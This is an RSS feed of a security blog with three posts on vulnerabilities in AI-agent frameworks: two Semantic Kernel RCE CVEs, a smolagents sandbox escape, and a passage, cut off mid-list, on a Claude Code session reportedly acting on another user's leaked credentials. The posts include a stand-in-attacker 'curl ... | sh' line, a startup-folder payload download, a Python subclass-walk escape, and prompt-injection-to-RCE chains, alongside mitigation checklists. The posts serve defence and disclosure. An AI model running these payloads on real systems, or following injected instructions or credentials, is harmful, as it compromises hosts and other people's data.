<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>AI Security on RockB</title><link>https://baeseokjae.github.io/categories/ai-security/</link><description>Recent content in AI Security on RockB</description><image><title>RockB</title><url>https://baeseokjae.github.io/images/og-default.png</url><link>https://baeseokjae.github.io/images/og-default.png</link></image><generator>Hugo</generator><language>en-us</language><lastBuildDate>Tue, 07 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://baeseokjae.github.io/categories/ai-security/index.xml" rel="self" type="application/rss+xml"/><item><title>Semantic Kernel Agent RCE Vulnerabilities Guide 2026: When Prompt Injection Becomes Code Execution</title><link>https://baeseokjae.github.io/posts/semantic-kernel-agent-rce-vulnerabilities-guide-2026/</link><pubDate>Tue, 07 Jul 2026 00:00:00 +0000</pubDate><guid>https://baeseokjae.github.io/posts/semantic-kernel-agent-rce-vulnerabilities-guide-2026/</guid><description>A technical breakdown of CVE-2026-26030 and CVE-2026-25592 — two critical RCE vulnerabilities in Microsoft&amp;#39;s Semantic Kernel that turned prompt injection into host compromise. Includes exploit mechanics, mitigation steps, and lessons for every agent framework.</description><content:encoded><![CDATA[<p>If you&rsquo;re building AI agents with Microsoft&rsquo;s Semantic Kernel, stop and check your version right now. Two critical vulnerabilities — CVE-2026-26030 (CVSS 9.9) and CVE-2026-25592 (CVSS 9.9) — turn prompt injection from a content-quality annoyance into a full host compromise primitive. I&rsquo;ve spent the last few weeks digging into both exploits, and the implications go far beyond Semantic Kernel itself.</p>
<p>Here&rsquo;s the uncomfortable truth: <strong>AI models are not security boundaries</strong>. Every parameter an LLM can influence when calling a tool is attacker-controlled input. If your framework passes that input to <code>eval()</code>, a file write function, or a shell command without validation, you&rsquo;ve built a remote code execution vector that only needs a cleverly crafted prompt to trigger.</p>
<h2 id="the-two-vulnerabilities-at-a-glance">The Two Vulnerabilities at a Glance</h2>
<table>
  <thead>
      <tr>
          <th>CVE</th>
          <th>Component</th>
          <th>CVSS</th>
          <th>Attack Vector</th>
          <th>Patched In</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>CVE-2026-26030</td>
          <td>Python SDK <code>InMemoryVectorStore</code></td>
          <td>9.9 (Critical)</td>
          <td>Prompt injection → search filter → <code>eval()</code> → RCE</td>
          <td><code>python-1.39.4</code></td>
      </tr>
      <tr>
          <td>CVE-2026-25592</td>
          <td>.NET SDK <code>SessionsPythonPlugin</code></td>
          <td>9.9 (Critical)</td>
          <td>Prompt injection → <code>DownloadFileAsync</code> → arbitrary file write → RCE</td>
          <td><code>1.71.0</code></td>
      </tr>
  </tbody>
</table>
<p>Both were disclosed in early 2026. Both earned a 9.9 CVSS because they require no special privileges, no user interaction beyond the initial prompt, and the impact is total host compromise.</p>
<h2 id="cve-2026-26030-the-python-eval-sink">CVE-2026-26030: The Python eval() Sink</h2>
<p>This one is the more technically interesting of the two. Semantic Kernel&rsquo;s <code>InMemoryVectorStore</code> — a vector store used for in-memory semantic search — accepts a <code>filter</code> parameter that gets converted into a Python lambda expression and passed to <code>eval()</code>.</p>
<p>Here&rsquo;s the chain:</p>
<ol>
<li>An attacker crafts a prompt that tells the agent to search the vector store with a malicious filter string</li>
<li>The filter string is interpolated into a lambda: <code>lambda x: {filter_string}</code></li>
<li>That lambda string is passed to Python&rsquo;s built-in <code>eval()</code></li>
<li>The original code had an AST blocklist — it tried to block dangerous operations by checking the parsed AST for forbidden node types</li>
<li>The bypass: traverse Python&rsquo;s class hierarchy via <code>BuiltinImporter</code> → <code>load_module</code> → <code>os.system</code></li>
</ol>
<p>The AST blocklist approach is the classic security mistake in dynamic languages. Python&rsquo;s object model is too rich to blocklist effectively. The fix in <code>python-1.39.4</code> replaces it with an allowlist approach: only specific AST node types are permitted, function calls are restricted to an explicit allowlist, and dangerous attribute access is blocked at the AST level rather than at runtime.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Vulnerable pattern (simplified)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_build_lambda</span>(filter_string: str):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># AST blocklist — fragile by design</span>
</span></span><span style="display:flex;"><span>    tree <span style="color:#f92672">=</span> ast<span style="color:#f92672">.</span>parse(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;lambda x: </span><span style="color:#e6db74">{</span>filter_string<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> node <span style="color:#f92672">in</span> ast<span style="color:#f92672">.</span>walk(tree):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> type(node) <span style="color:#f92672">in</span> BLOCKLIST:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Forbidden construct&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> eval(compile(tree, <span style="color:#e6db74">&#34;&lt;string&gt;&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bypass: BuiltinImporter.load_module(&#34;os&#34;).system(&#34;curl http://attacker/payload | sh&#34;)</span>
</span></span></code></pre></div><p>The bypass works because <code>BuiltinImporter</code> is a built-in class that can load arbitrary modules. The AST blocklist didn&rsquo;t account for class hierarchy traversal — you don&rsquo;t need <code>import</code> or <code>__import__</code> when you can walk up the type hierarchy of any accessible object to find <code>BuiltinImporter</code>, call <code>load_module(&quot;os&quot;)</code>, and then call <code>system()</code>.</p>
<p><strong>If you&rsquo;re using <code>InMemoryVectorStore</code> in production, stop.</strong> It was never designed for untrusted input. The patched version is safer, but the fundamental design — building executable code from string interpolation — is something I&rsquo;d avoid entirely for any store that processes AI-generated content.</p>
<h2 id="cve-2026-25592-the-accidental-kernelfunction">CVE-2026-25592: The Accidental KernelFunction</h2>
<p>This one is almost comical in its simplicity. Semantic Kernel&rsquo;s .NET <code>SessionsPythonPlugin</code> has a <code>DownloadFileAsync</code> method that downloads a file from a URL to a local path. Someone marked it with <code>[KernelFunction]</code> — the attribute that exposes a method as an AI-callable tool.</p>
<p>That&rsquo;s it. No authentication check. No path validation. No confirmation dialog. An AI agent can call <code>DownloadFileAsync</code> with any URL and any local file path, and the framework happily writes the file.</p>
<p>The attack scenario on Windows is straightforward:</p>
<ol>
<li>Prompt injection tells the agent to download a malicious executable</li>
<li>The agent calls <code>DownloadFileAsync(&quot;http://attacker/payload.exe&quot;, &quot;C:\\Users\\Victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe&quot;)</code></li>
<li>Next time the user signs in, the payload executes</li>
</ol>
<p>The fix in <code>1.71.0</code> does two things: removes the <code>[KernelFunction]</code> attribute from <code>DownloadFileAsync</code>, and adds <code>ValidateLocalPathForDownload()</code> that checks the destination path against an allowlist of permitted directories.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#75715e">// Before (vulnerable)</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[KernelFunction]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">async</span> Task DownloadFileAsync(<span style="color:#66d9ef">string</span> url, <span style="color:#66d9ef">string</span> localFilePath)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">using</span> var client = <span style="color:#66d9ef">new</span> HttpClient();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> data = <span style="color:#66d9ef">await</span> client.GetByteArrayAsync(url);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> File.WriteAllBytesAsync(localFilePath, data);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// After (patched in 1.71.0)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// [KernelFunction] removed entirely</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Path validation added</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">string</span> ValidateLocalPathForDownload(<span style="color:#66d9ef">string</span> path)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Only allow paths under a configured safe directory</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The lesson here applies to every framework: <strong>every public method annotated as a tool is a potential attack surface</strong>. Before you add <code>[KernelFunction]</code>, <code>@tool</code>, or <code>@agent_function</code> to a method, ask yourself: &ldquo;What happens if an attacker controls every parameter of this method?&rdquo;</p>
<h2 id="why-these-matter-beyond-semantic-kernel">Why These Matter Beyond Semantic Kernel</h2>
<p>Semantic Kernel has 27,000+ GitHub stars and is embedded in Microsoft 365 Copilot, Azure Container Apps dynamic sessions, and countless enterprise RAG applications. But the vulnerability class isn&rsquo;t unique to Microsoft&rsquo;s framework.</p>
<p>LangChain had similar issues with <code>eval()</code> in its early Python REPL tool. CrewAI&rsquo;s tool system passes model-generated parameters directly to function calls. AutoGen&rsquo;s code execution sandbox has been <a href="https://baeseokjae.github.io/posts/semantic-kernel-autogen-migration-agent-framework-2026/">bypassed multiple times</a>. Every agent framework that wires LLM outputs to tool calls without parameter validation has the same fundamental problem.</p>
<p>The pattern is always the same:</p>
<ol>
<li>Framework exposes a tool that takes a string parameter</li>
<li>The LLM generates the parameter value based on user + system prompt</li>
<li>Prompt injection contaminates the parameter</li>
<li>The framework passes the contaminated parameter to a sensitive sink (<code>eval()</code>, file write, shell command)</li>
<li>Host compromise</li>
</ol>
<p>I covered <a href="https://baeseokjae.github.io/posts/clean-repo-prompt-injection-defense-guide-2026/">prompt injection defense patterns</a> in a previous post, but these CVEs raise the stakes. Prompt injection isn&rsquo;t just about leaking context or generating offensive content anymore — it&rsquo;s a code execution primitive.</p>
<h2 id="mitigation-checklist">Mitigation Checklist</h2>
<p>If you&rsquo;re running Semantic Kernel today, here&rsquo;s your action plan:</p>
<p><strong>Immediate (today):</strong></p>
<ul>
<li><input disabled="" type="checkbox"> Upgrade Python SDK to <code>&gt;=1.39.4</code></li>
<li><input disabled="" type="checkbox"> Upgrade .NET SDK to <code>&gt;=1.71.0</code></li>
<li><input disabled="" type="checkbox"> Audit all <code>[KernelFunction]</code> / <code>@kernel_function</code> annotations in your codebase</li>
<li><input disabled="" type="checkbox"> Check for any <code>eval()</code>, <code>exec()</code>, or <code>compile()</code> calls in your plugin code</li>
</ul>
<p><strong>Short-term (this week):</strong></p>
<ul>
<li><input disabled="" type="checkbox"> Implement Function Invocation Filters for all file I/O operations</li>
<li><input disabled="" type="checkbox"> Add runtime monitoring for suspicious child processes (cmd.exe, powershell, python -c) spawned by agent host processes</li>
<li><input disabled="" type="checkbox"> Review your vector store choice — <code>InMemoryVectorStore</code> should not be in production pipelines</li>
<li><input disabled="" type="checkbox"> Set up Microsoft Defender advanced hunting queries for post-exploitation indicators (the Microsoft Security Blog post from May 7 has specific KQL queries)</li>
</ul>
<p><strong>Ongoing:</strong></p>
<ul>
<li><input disabled="" type="checkbox"> Treat all AI-influenced parameters as untrusted input — validate, sanitize, and allowlist</li>
<li><input disabled="" type="checkbox"> Prefer allowlist-based validation over blocklist-based for every security check</li>
<li><input disabled="" type="checkbox"> Run <a href="https://baeseokjae.github.io/posts/ai-agent-security-tools-2026/">agent security tooling</a> in your CI pipeline to catch exposed tool surfaces</li>
<li><input disabled="" type="checkbox"> Monitor the <a href="https://baeseokjae.github.io/posts/agent-skills-supply-chain-security-guide-2026/">agent supply chain</a> — third-party plugins and skills are common sources of accidentally exposed functions</li>
</ul>
<h2 id="the-bigger-picture">The Bigger Picture</h2>
<p>What makes these CVEs a watershed moment is that they close the loop on a threat model that the industry has been hand-waving about for two years. We&rsquo;ve known prompt injection was theoretically dangerous. Now we have concrete proof that it can lead to RCE in the most widely-used enterprise agent framework.</p>
<p>The Microsoft Security Blog post from May titled &ldquo;When prompts become shells&rdquo; isn&rsquo;t hyperbole — it&rsquo;s an accurate description of the new reality. Every agent framework needs to treat the tool boundary as a trust boundary, with the same rigor we apply to API endpoints exposed to the internet.</p>
<p>The frameworks that survive this shift will be the ones that build security into the tool abstraction layer itself — not as an afterthought, but as a first-class concern. Parameter validation, capability-based access control, and explicit allowlists for sensitive operations need to be framework features, not something every developer has to implement from scratch.</p>
<p>For now, patch your Semantic Kernel instances, audit your tool annotations, and start treating every parameter the LLM touches as potentially malicious. The era of &ldquo;prompt injection is just a content issue&rdquo; is over.</p>
]]></content:encoded></item><item><title>smolagents Python Executor Code Injection Guide 2026 (CVE-2026-4963)</title><link>https://baeseokjae.github.io/posts/smolagents-python-executor-code-injection-guide-2026/</link><pubDate>Tue, 07 Jul 2026 00:00:00 +0000</pubDate><guid>https://baeseokjae.github.io/posts/smolagents-python-executor-code-injection-guide-2026/</guid><description>CVE-2026-4963 is a critical code injection in Hugging Face smolagents &amp;lt;= 1.25.0-dev.0. Here&amp;#39;s how the local Python executor sandbox fails, how attackers bypass it, and what to do about it.</description><content:encoded><![CDATA[<p>If you&rsquo;re running Hugging Face&rsquo;s smolagents in production with the local Python executor, stop what you&rsquo;re doing and read this. CVE-2026-4963 is a code injection vulnerability in smolagents &lt;= 1.25.0-dev.0 that lets an attacker execute arbitrary Python code on the host machine. The NVD rates it <strong>10.0 CRITICAL</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H). The exploit is public. And here&rsquo;s the worst part — this is an <strong>incomplete fix</strong> for CVE-2025-9959, meaning the previous patch didn&rsquo;t actually close the hole.</p>
<p>I&rsquo;ve spent the last few hours digging through the source code, the advisory, and the public exploit PoCs. Here&rsquo;s exactly how the sandbox breaks, why the blocklist approach is fundamentally flawed, and what you should do right now.</p>
<h2 id="what-is-smolagents">What Is smolagents?</h2>
<p>smolagents is Hugging Face&rsquo;s lightweight framework for building AI agents. The idea is simple: you give an LLM a set of tools, and it writes Python code to accomplish tasks. That generated code gets executed in a <strong>local Python executor</strong> — a custom AST interpreter in <code>src/smolagents/local_python_executor.py</code> that&rsquo;s supposed to sandbox the execution.</p>
<p>The executor parses the agent&rsquo;s code into an AST (Abstract Syntax Tree) and walks it node by node, evaluating only the operations it considers safe. It maintains a blocklist of dangerous modules (<code>os</code>, <code>subprocess</code>, <code>shutil</code>, <code>socket</code>, <code>sys</code>, etc.) and dangerous functions (<code>builtins.eval</code>, <code>builtins.exec</code>, <code>os.system</code>, etc.). It also maintains an allowlist of safe built-in functions (<code>print</code>, <code>len</code>, <code>range</code>, <code>math.sqrt</code>, etc.) and authorized imports.</p>
<p>The problem? <strong>Blocklists don&rsquo;t work when the attacker controls the input.</strong></p>
<h2 id="the-vulnerability-three-bypass-vectors">The Vulnerability: Three Bypass Vectors</h2>
<p>CVE-2026-4963 affects three functions in <code>local_python_executor.py</code>:</p>
<ul>
<li><code>evaluate_augassign</code> — handles <code>+=</code>, <code>-=</code>, <code>*=</code>, etc.</li>
<li><code>evaluate_call</code> — handles function calls</li>
<li><code>evaluate_with</code> — handles <code>with</code> statements</li>
</ul>
<p>Let me walk through each one.</p>
<h3 id="1-augmented-assignment-bypass">1. Augmented Assignment Bypass</h3>
<p>The <code>evaluate_augassign</code> function evaluates the target of an augmented assignment by calling <code>get_current_value</code>, which uses Python&rsquo;s <code>getattr()</code> to access attributes on objects:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_current_value</span>(target: ast<span style="color:#f92672">.</span>AST) <span style="color:#f92672">-&gt;</span> Any:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(target, ast<span style="color:#f92672">.</span>Attribute):
</span></span><span style="display:flex;"><span>        obj <span style="color:#f92672">=</span> evaluate_ast(target<span style="color:#f92672">.</span>value, state, static_tools, custom_tools, authorized_imports)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> getattr(obj, target<span style="color:#f92672">.</span>attr)
</span></span></code></pre></div><p>Then it writes the result back using <code>set_value</code>, which calls <code>setattr()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> isinstance(target, ast<span style="color:#f92672">.</span>Attribute):
</span></span><span style="display:flex;"><span>    obj <span style="color:#f92672">=</span> evaluate_ast(target<span style="color:#f92672">.</span>value, state, static_tools, custom_tools, authorized_imports)
</span></span><span style="display:flex;"><span>    setattr(obj, target<span style="color:#f92672">.</span>attr, value)
</span></span></code></pre></div><p>There&rsquo;s no check on what <code>obj</code> is. If an attacker can get a reference to a dangerous object — say, a module like <code>os</code> — they can use <code>obj.__dict__ += something</code> or <code>obj.__class__ += something</code> to modify internal state. The sandbox only checks <code>ast.Name</code> targets against <code>static_tools</code>, but <code>ast.Attribute</code> targets pass through unchecked.</p>
<h3 id="2-function-call-bypass">2. Function Call Bypass</h3>
<p>The <code>evaluate_call</code> function handles method calls on objects obtained through attribute access:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> isinstance(call<span style="color:#f92672">.</span>func, ast<span style="color:#f92672">.</span>Attribute):
</span></span><span style="display:flex;"><span>    obj <span style="color:#f92672">=</span> evaluate_ast(call<span style="color:#f92672">.</span>func<span style="color:#f92672">.</span>value, state, static_tools, custom_tools, authorized_imports)
</span></span><span style="display:flex;"><span>    func_name <span style="color:#f92672">=</span> call<span style="color:#f92672">.</span>func<span style="color:#f92672">.</span>attr
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> hasattr(obj, func_name):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> InterpreterError(<span style="color:#f92672">...</span>)
</span></span><span style="display:flex;"><span>    func <span style="color:#f92672">=</span> getattr(obj, func_name)
</span></span></code></pre></div><p>The dangerous function check only looks at <code>func.__name__</code> and <code>func.__module__</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> qualified_function_name <span style="color:#f92672">in</span> DANGEROUS_FUNCTIONS:
</span></span><span style="display:flex;"><span>    module_name, function_name <span style="color:#f92672">=</span> qualified_function_name<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">&#34;.&#34;</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (
</span></span><span style="display:flex;"><span>        (static_tools <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> function_name <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> static_tools)
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">and</span> result<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">==</span> function_name
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">and</span> result<span style="color:#f92672">.</span>__module__ <span style="color:#f92672">==</span> module_name
</span></span><span style="display:flex;"><span>    ):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> InterpreterError(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Forbidden access to function: </span><span style="color:#e6db74">{</span>function_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>This check is trivially bypassable. If you can get a reference to <code>os.system</code> through a different path — say, by accessing it as an attribute of a module object you smuggled in — the <code>__name__</code> and <code>__module__</code> still match, but the check only runs on the <em>result</em> of an expression, not on intermediate objects used in attribute chains.</p>
<p>The classic Python sandbox escape works here:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()
</span></span></code></pre></div><p>This gives you every class loaded in the interpreter. From there, you find one with access to <code>builtins</code> or <code>os</code> and call it. The executor blocks <code>__</code> prefixed attributes in <code>evaluate_attribute</code>, but the subscript access in <code>evaluate_subscript</code> doesn&rsquo;t check for dunder methods on the <em>result</em> — only <code>evaluate_attribute</code> does.</p>
<h3 id="3-with-statement-bypass">3. With Statement Bypass</h3>
<p>The <code>evaluate_with</code> function calls <code>__enter__</code> and <code>__exit__</code> on context manager objects:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>context_expr <span style="color:#f92672">=</span> evaluate_ast(item<span style="color:#f92672">.</span>context_expr, state, static_tools, custom_tools, authorized_imports)
</span></span><span style="display:flex;"><span>enter_result <span style="color:#f92672">=</span> context_expr<span style="color:#f92672">.</span>__enter__()
</span></span></code></pre></div><p>If an attacker can construct or obtain an object with a malicious <code>__enter__</code> method — for example, by defining a class inside the executor (which <code>evaluate_class_def</code> allows) — they can execute arbitrary code during the <code>with</code> block setup.</p>
<h2 id="why-the-blocklist-approach-fails">Why the Blocklist Approach Fails</h2>
<p>This is the core lesson. smolagents&rsquo; executor uses a <strong>deny-list</strong> strategy: it lists what&rsquo;s forbidden and allows everything else. This is the opposite of a <strong>allow-list</strong> strategy, where you list what&rsquo;s permitted and deny everything else.</p>
<p>The <code>DANGEROUS_MODULES</code> list has 9 entries. The <code>DANGEROUS_FUNCTIONS</code> list has 8 entries. But Python&rsquo;s standard library has hundreds of modules, and the number of ways to access them through class introspection, <code>__subclasses__()</code>, <code>__globals__</code>, and <code>__builtins__</code> is effectively infinite.</p>
<p>Here&rsquo;s a concrete example of what an attacker can do even with the blocklist in place:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Get a reference to a class that has access to builtins</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">X</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Walk the MRO to find object, then subclasses</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (The executor blocks __ in attribute access, but not in subscript)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3: Once you have a reference to a class with __init__.__globals__,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># you can access any module in its globals</span>
</span></span></code></pre></div><p>The <code>evaluate_class_def</code> function allows defining new classes. The <code>evaluate_function_def</code> function allows defining new functions. Both of these create callable objects that get stored in <code>state</code> or <code>custom_tools</code>. Once a user-defined function exists, its <code>__globals__</code> attribute (if accessible) leaks the entire execution environment.</p>
<h2 id="the-incomplete-fix-problem">The Incomplete Fix Problem</h2>
<p>CVE-2026-4963 is explicitly labeled as an <strong>incomplete fix for CVE-2025-9959</strong>. This means the original vulnerability was reported, a patch was released, and the patch didn&rsquo;t actually fix it. The advisory notes that &ldquo;the vendor was contacted early about this disclosure but did not respond in any way.&rdquo;</p>
<p>This pattern is unfortunately common in AI agent security. The attack surface is large, the sandboxing problem is hard, and one-off patches that add more entries to a blocklist rarely close all the bypass paths.</p>
<h2 id="mitigation-what-you-should-do">Mitigation: What You Should Do</h2>
<h3 id="immediate-today">Immediate (Today)</h3>
<ol>
<li>
<p><strong>Pin smolagents to a version before 1.25.0-dev.0</strong> if you must use it, or better yet, <strong>don&rsquo;t use the local Python executor at all</strong>. Switch to the code execution tool pattern where the agent writes code but a separate, hardened sandbox (like gVisor, Firecracker microVM, or Docker with no-network and read-only rootfs) actually runs it.</p>
</li>
<li>
<p><strong>If you can&rsquo;t upgrade</strong>, set <code>authorized_imports</code> to an empty list <code>[]</code> and never use <code>&quot;*&quot;</code>. This at least blocks the import vector. It won&rsquo;t stop class introspection attacks, but it raises the bar.</p>
</li>
<li>
<p><strong>Run smolagents in a container</strong> with no network access, no write access to the host filesystem, and strict resource limits. Assume the sandbox will be bypassed — because it will.</p>
</li>
</ol>
<h3 id="medium-term">Medium-term</h3>
<ol>
<li>
<p><strong>Replace the AST interpreter with a proper sandbox</strong>. Options include:</p>
<ul>
<li><strong>Pyodide</strong> — CPython compiled to WebAssembly, runs in a browser-like sandbox</li>
<li><strong>RestrictedPython</strong> — a battle-tested subset of Python for untrusted code</li>
<li><strong>gVisor or Firecracker</strong> — full OS-level isolation for each agent execution</li>
<li><strong>Subprocess with seccomp</strong> — run Python in a subprocess with seccomp-bpf syscall filtering</li>
</ul>
</li>
<li>
<p><strong>Audit any AI agent framework that uses AST-level sandboxing</strong>. The pattern is inherently fragile. Every AST node type you support is a potential bypass surface. smolagents supports 30+ AST node types including <code>ClassDef</code>, <code>FunctionDef</code>, <code>With</code>, <code>Try</code>, <code>Raise</code>, <code>Delete</code>, and <code>AugAssign</code> — each one is a potential escape vector.</p>
</li>
</ol>
<h3 id="long-term">Long-term</h3>
<p>The industry needs a better approach to agent code execution. The current pattern — &ldquo;let the LLM write Python, then run it in a sandbox&rdquo; — is fundamentally risky because LLMs are good at finding edge cases. I&rsquo;ve written about this before in my <a href="/posts/ai-agent-security-tools-2026/">AI Agent Security Best Practices</a> post, and the conclusion is the same: <strong>don&rsquo;t trust the sandbox, trust the isolation</strong>.</p>
<h2 id="the-bigger-picture">The Bigger Picture</h2>
<p>CVE-2026-4963 is not an isolated incident. It&rsquo;s part of a pattern. We&rsquo;ve seen similar issues in <a href="/posts/praisonai-cross-origin-agent-execution-vulnerability-guide-2026/">PraisonAI</a>, in various MCP server implementations, and in the <a href="/posts/agent-skills-supply-chain-security-guide-2026/">agent supply chain</a>. The fundamental problem is that AI agent frameworks are being built with security as an afterthought — sandboxing is bolted on after the fact, and the sandbox is always playing catch-up with the attacker.</p>
<p>The smolagents executor is a well-written piece of code for what it tries to do. The AST walking is clean, the error handling is thorough, and the code is readable. But no amount of clean code can make a blocklist-based sandbox secure against a determined attacker who controls the input.</p>
<p>If you&rsquo;re building an AI agent system today, assume the code executor will be compromised. Design your architecture so that a compromised executor can&rsquo;t access your production database, your API keys, or your customer data. That&rsquo;s the only defense that actually works.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/advisories/GHSA-54fq-v6x8-244g">GitHub Advisory GHSA-54fq-v6x8-244g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4963">NVD Entry for CVE-2026-4963</a></li>
<li><a href="https://advisories.gitlab.com/pypi/smolagents/CVE-2026-4963/">GitLab Advisory Database Entry</a></li>
<li><a href="https://github.com/huggingface/smolagents">smolagents source code on GitHub</a></li>
<li><a href="/posts/ai-agent-security-tools-2026/">AI Agent Security Tools 2026</a></li>
<li><a href="/posts/agent-skills-supply-chain-security-guide-2026/">Agent Skills Supply Chain Security Guide</a></li>
</ul>
]]></content:encoded></item><item><title>Claude Code Cross-User Data Leak 2026: What Happened and How to Protect Yourself</title><link>https://baeseokjae.github.io/posts/claude-code-cross-user-data-leak-2026/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://baeseokjae.github.io/posts/claude-code-cross-user-data-leak-2026/</guid><description>In June 2026, a Claude Code user discovered another person&amp;#39;s production server credentials in their own session — and the AI acted on them. Here&amp;#39;s the full breakdown of the cross-user data leak, the VSCode extension selection leak, command injection vectors, and what you can do right now.</description><content:encoded><![CDATA[<p>If you use Claude Code in production, stop and read this. On June 29, 2026, a developer opened their Claude Code session and found <strong>someone else&rsquo;s production server credentials</strong> — IP address, root username, and plaintext password — sitting in their context window. The AI then used those credentials to SSH into a server the user had never seen before and ran a database migration against a third-party PostgreSQL instance.</p>
<p>This isn&rsquo;t a hypothetical vulnerability. It&rsquo;s a confirmed, reproducible cross-tenant data leak that breaks the fundamental isolation guarantee of any SaaS tool. Here&rsquo;s exactly what happened, why it matters, and what you can do about it today.</p>
<h2 id="what-happened-the-claude-code-cross-user-data-leak-of-2026">What Happened? The Claude Code Cross-User Data Leak of 2026</h2>
<p>The incident was reported in <a href="https://github.com/anthropics/claude-code/issues/72274">GitHub issue #72274</a> on the Claude Code repository. A user who only owned the server <code>59.110.139.37</code> found credentials for a completely different host — <code>8.211.46.34</code> — injected into their Claude Code session. The credentials included a root username and a plaintext password. Claude Code then:</p>
<ol>
<li>Read the leaked credentials from context</li>
<li>Established an SSH connection to <code>8.211.46.34</code></li>
<li>Connected to a PostgreSQL database called <code>tk_dist</code></li>
<li>Executed <code>INSERT</code> and <code>UPDATE</code> statements against pricing and subscription tables</li>
</ol>
